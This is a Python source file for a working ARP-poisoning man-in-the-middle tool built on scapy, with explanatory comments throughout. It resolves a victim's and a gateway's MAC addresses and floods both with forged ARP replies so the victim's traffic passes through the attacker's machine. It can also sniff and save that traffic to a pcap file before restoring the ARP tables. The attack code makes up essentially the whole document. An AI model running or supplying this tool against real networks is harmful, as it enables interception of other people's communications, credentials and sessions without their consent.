from datetime import datetime
import sys,argparse,time
import scapy.all as scapy
from multiprocessing import Process
from termcolor import colored

def get_args():
    parser=argparse.ArgumentParser()
    parser.add_argument('-vIP','--vicitmip',dest="victimip",help="Specify the Victim IP! ",required=True)
    parser.add_argument('-gIP','--gatewayip',dest="gatewayip",required=True,help=" Specify the gateway IP !(gateway=> your router) ")
    parser.add_argument('-interface',dest="interface",default="eth0",help="Specify the interface : (default:eth0")
    parser.add_argument('-sniff',dest="sniff",help="Specify if you want to only capture certain packets and get it in pcap file ",required=False,action='store_true')
    parser.add_argument('-pc',metavar="Packet count",dest="packetCount",default=1000,type=int,help="Specify the packet count you want to sniff! (Use this when sniff used ), Default : 1000",required=False)
    arguments=parser.parse_args()
    
    if not((not arguments.sniff) or arguments.packetCount):
        print(colored("[-] Packet count should only used when sniffing option is used ! ",'red'))
        parser.print_help()
        sys.exit()
        
    return arguments


def restore():
    print(colored("[+] Getting Everything right ! ",'green'))
    # Crafting the packet for victim to normal stuff ! 
    # we are sending Arp reply packet in which we are saying hey user this is me this is my mac address and the packet's destination mac address goes to whole lan as this is a broadcast 
    normal_victim_packet=scapy.ARP(psrc=gatewayIp,hwsrc=gatewayMac,pdst=victimIp,hwdst="ff:ff:ff:ff:ff:ff",op=2)
    
    # Doing the same for router we will send arp reply packet to gateway with details about the victim mac and ip address and this message will be send to all the clients so somehow , gateway will know that this is my client ! 
    normal_gateway_packet=scapy.ARP(psrc=victimIp,hwsrc=victimMac,pdst=gatewayIp,hwdst="ff:ff:ff:ff:ff:ff",op=2)
    # Sending the message 7 times 
    for i in range(7):
        scapy.send(normal_victim_packet,verbose=False)
        scapy.send(normal_gateway_packet,verbose=False)

def get_mac_addr(ip):
    # Creating a arp frame with destination ip address 
    arp_request_frame=scapy.ARP(pdst=ip)
    # Creating a ethernet framw with destination mac set to global broadcast means this packet will go to every client to your lan ! 
    ether_broadcast_frame=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Combining the packet means combining different layers of the packet, after this packet will be converted into binary and will be delivered ! 
    # It will look like this
    # "Ether / ARP who has 192.168.34.134 says 192.168.34.121"
    arp_ether_send_packet=ether_broadcast_frame/arp_request_frame

    #sending the packet and reciving the output , in output we recieve a tuple of answered clients and unanswered clients as the elements so taking only the answered client
    #why srp => Srp can be used to send and receive packets at layer 2
    response_packet=scapy.srp(arp_ether_send_packet,timeout=2,retry=10,verbose=False)[0]
    
    # In reply of active replied client we are replied with a list in which the first index '0' consists the data about 2nd layer The Data Link layer and in index 1 it consists the data about Network layer so are parsing data from the layer 3 
    # The index 1 has a object inside it which has data , we are only returning hwsrc which is client mac address 
    return response_packet[0][1].hwsrc


def poisoning(victimIp,victimMac,gatewayIp,gatewayMac):
    global posioning_process
    #pdst => Destination Ip 
    #psrc=source ip address 
    #hwdst => destination mac address
    #hsrc => source mac address 
    
    #op => it stands for operation , arp  has two operations in which one is 'who-has' in which arp packet asks This is the ip what is the mac addr for this and the other is 'is-at', in this the client answers that Hey, I am the one who has this ip and my mac address is this : blah
    
    
    # we have crafted a arp packet in which we made the packet look as it is from router by specifying gateway  gateway ip address as the sender and we send it to the our victim ip now we will send this packet from our device , so to him victim mac address will be our mac address and traffic will be sent to us 
    
    victim_poison_packet=scapy.ARP(pdst=victimIp,psrc=gatewayIp,hwdst=victimMac,op=2)
    
    # Here also we are crafing a Arp packet in which we are sending the router a arp packet in which we have set the destiantion ip and mac to the victim so now this packet will be sent from our attacking machine server will think we are the client and will send data to out machine
    
    gateway_poison_packet=scapy.ARP(pdst=gatewayIp,psrc=victimIp,hwdst=gatewayMac,op=2)
    print("-"*60)
    print(colored("[+] Arp Poisioning has been successfully started ",'yellow',attrs=['concealed']))
    print("-"*60)
    
    # Sending the arp packet infinintely 
    while True:
        # clearing the screeen everytime a message is sent ! otherwise it will show sent 1 packet.
        # sys.stdout.write('.')
        sys.stdout.flush()
        # Sending the packets to the victims 
        try:
            scapy.send(victim_poison_packet,verbose=False)
            scapy.send(gateway_poison_packet,verbose=False)
        except KeyboardInterrupt:
            # Restoring all the Poisoning so everything could work normally and then sys.exit()ing the program
            # posioning_process.terminate()
            restore()
            sys.exit()()
        # except:
            # if any other exception happens , it doesn't start throwing shit at me 
            # pass    
        else:
            # for sending the packets every two seconds and not continously 
            time.sleep(2)
        
def sniffing(packetCount,interface):
    global posioning_process
    # waiting for poisioning to happen ! 
    time.sleep(5)
    print("-"*60)
    print(colored("[-] Yeah ! Sniffing some packets !!",'green'))
    print("-"*60)
    # BPf => Berkley Packet Filters , It is a techonlogy which provides the functionality to filter the packets 
    bpf_filter="ip host %s" % victimIp
    
    # sniffing the packets and storing the packets 
    packets=scapy.sniff(count=packetCount,filter=bpf_filter,iface=interface)
    # This scapy function writes a list of packets into pcap file which can be later accessed by wireshark
    scapy.wrpcap('poisionedpackets.pcap',packets)
    
    restore()
    posioning_process.terminate()
    print("[+] Finished , All your packets are in :poisionedpackets.pcap ")

def print_banner(victimIp,victimMac,gatewayIp,gatewayMac):
    print("-"*60)
    print(colored(f"Arp Poisoning starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')} ",'cyan',attrs=['bold']))
    print("-"*60)
    print(f"[*] Victim IP\t: {victimIp}")
    print(f"[*] Victim Mac\t: {victimMac}")
    print(f"[*] Gateway Ip\t: {gatewayIp}")
    print(f"[*] Gateway Mac\t: {gatewayMac}")
    print("-"*60)
    
if __name__=="__main__":
    arguments=get_args()
    

    # Getting Victim ip 
    victimIp=arguments.victimip
    victimMac=get_mac_addr(victimIp)
    
    # Getting gateway Ips
    gatewayIp=arguments.gatewayip
    gatewayMac=get_mac_addr(gatewayIp)
    
    # Specifying interface 
    interface=arguments.interface
    
    #printing bannner 
    print_banner(victimIp,victimMac,gatewayIp,gatewayMac)
    
    # Let's start process for poisioning and if enabled one for sniffing so both process uses their own resources differently 
    
    posioning_process=Process(target=poisoning,args=(victimIp,victimMac,gatewayIp,gatewayMac))
    posioning_process.start()
        
    
    if arguments.sniff:
        sniffing_process=Process(target=sniffing,args=(arguments.packetCount,arguments.interface))
        sniffing_process.start()